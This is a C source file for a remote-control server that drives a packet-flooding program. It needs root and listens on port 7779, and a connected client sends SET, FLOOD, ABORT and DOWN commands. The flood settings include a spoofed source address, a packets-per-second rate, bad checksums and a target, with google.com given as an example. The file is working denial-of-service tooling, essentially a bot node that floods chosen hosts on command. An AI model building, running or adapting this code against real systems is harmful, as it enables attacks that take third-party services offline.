/*
 * Copyright (c) 2025, oldteam. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *   this list of conditions and the following disclaimer in the documentation
 *   and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "../../include/include.h"

/* target dstport method unlimit source pps time interface random scrport badsum */
/* "google.com" 80 0 1 ARAND 100 5 NULL 3 ARAND 0 */

#define SERVERPORT	7779

#define CMD_FLOOD	"FLOOD"
#define CMD_ABORT	"ABORT"
#define CMD_SET		"SET"
#define CMD_DOWN	"DOWN"

char	config[65535];
int	fd=-1, fdc=-1;
pid_t	curcmdpid=-1;
char	*prog=NULL;

static inline void msgl(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	if (fmt) {
		fprintf(stdout, "[server.c]\t");
		(void)vfprintf(stdout, fmt, ap);
	}
	va_end(ap);
}

static inline void abortcmd(void)
{
	if (curcmdpid>0) {
		kill(curcmdpid, SIGKILL);
		waitpid(curcmdpid, NULL, 0);
		curcmdpid=-1;
		msgl("command aborted\n");
	}
}

static inline noreturn void down(void)
{
	msgl("DOWN\n");
	if (fdc>=0)
		close(fdc);
	if (fd>=0)
		close(fd);
	exit(0);
}

static inline void floodexec(char *cmd)
{
	char *args[64];
	pid_t pid;
	int i;

	i=0;
	cmd[strcspn(cmd, "\r\n")]='\0';
	args[i++]=strtok(cmd, " ");
	while ((args[i++]=strtok(NULL, " ")));
	if (!args[0]) return;

	pid=fork();
	if (pid==0) {
		execvp(args[0], args);
		down();
	}
	else if (pid>0)
		curcmdpid=pid;
}

static inline ssize_t writedata(int fd, const void *buf, size_t count)
{
	size_t total_written=0,written=0;
	const char *ptr=buf;

	while (total_written<count) {
		written=write(fd,ptr+total_written,count-total_written);
		if (written==-1)
			return -1;
		total_written+=written;
	}
	return total_written;
}

static inline void command(char *cmd)
{
	char first[100],rest[100],res[65535];
	char *tokens[100];
	char *tok;
	int n,fd;

	memset(rest,0,sizeof(rest));
	memset(first,0,sizeof(first));

	cmd[strcspn(cmd,"\r\n")]='\0';
	sscanf(cmd,"%s %[^\n]",first,rest);

	if (!(strncmp(first, CMD_ABORT, sizeof(CMD_ABORT)-1))) {
		abortcmd();
		return;
	}
	if (!(strncmp(first, CMD_SET, sizeof(CMD_SET)-1))) {
		memset(config,0,sizeof(config));
		memset(tokens, 0, sizeof(tokens));
		n=0;
		tok=strtok(rest," ");
		while (tok&&n<100) {
			tokens[n++]=tok;
			tok=strtok(NULL," ");
		}
		snprintf(config,sizeof(config),
			"target=%s;dstport=%s;method=%s;unlimit=%s;"
			"source=%s;pps=%s;time=%s;interface=%s;random=%s;"
			"srcport=%s;badsum=%s;",
			tokens[0],tokens[1],tokens[2],tokens[3],tokens[4],tokens[5],
			tokens[6],tokens[7],tokens[8],tokens[9],tokens[10]);
		msgl("SET CONFIG %s\n", config);
		return;
	}
	if (!(strncmp(first, CMD_FLOOD, sizeof(CMD_FLOOD)-1))) {
		memset(res,0,sizeof(res));
		assert((fd=open("tmpconfig",O_WRONLY|O_CREAT|O_TRUNC,0644))!=-1);
		writedata(fd,config,strlen(config));
		close(fd);
		snprintf(res,sizeof(res),"./%s tmpconfig", prog);
		msgl("EXEC %s\n", res);
		floodexec(res);
		return;
	}
}

int main(int argc, char **argv)
{
	struct sockaddr_in	sin_s, sin_c;
	socklen_t		sin_clen;
	char			recvbuf[65535];
	ssize_t			n;

	assert(argc==2);
	if ((geteuid()!=0)) {
		msgl("ONLY SUDO RUN\n");
		down();
	}
	if (access(argv[1], F_OK)!=0) {
		msgl("program (%s) not found!\n", argv[1]);
		down();
	}
	else
		msgl("OK program (%s) found\n", argv[1]);
	prog=argv[1];

	msgl("attempted initiating\n");
	assert((fd=socket(AF_INET,SOCK_STREAM,0))>=0);

	memset(&sin_s, 0, sizeof(sin_s));
	sin_s.sin_family=AF_INET;
	sin_s.sin_addr.s_addr=INADDR_ANY;
	sin_s.sin_port=htons(SERVERPORT);

	assert((bind(fd,(struct sockaddr *)&sin_s, sizeof(sin_s))!=-1));
	msgl("waiting connection\n");
	assert((listen(fd,1))!=-1);

	sin_clen=sizeof(sin_c);
	assert((fdc=accept(fd, (struct sockaddr *)&sin_c, &sin_clen))!=-1);
	msgl("client connected (%s:%d)\n",
		inet_ntoa(sin_c.sin_addr), ntohs(sin_c.sin_port));

	for (;;) {
		memset(recvbuf,0,sizeof(recvbuf));
		n=read(fdc,recvbuf,sizeof(recvbuf));
		if (n<=0)
			break;
		msgl("client send command - %s", recvbuf);
		if (!(strncmp(recvbuf, CMD_DOWN, sizeof(CMD_DOWN)-1)))
			down();
		command(recvbuf);
	}

	down();
	return 0;
}
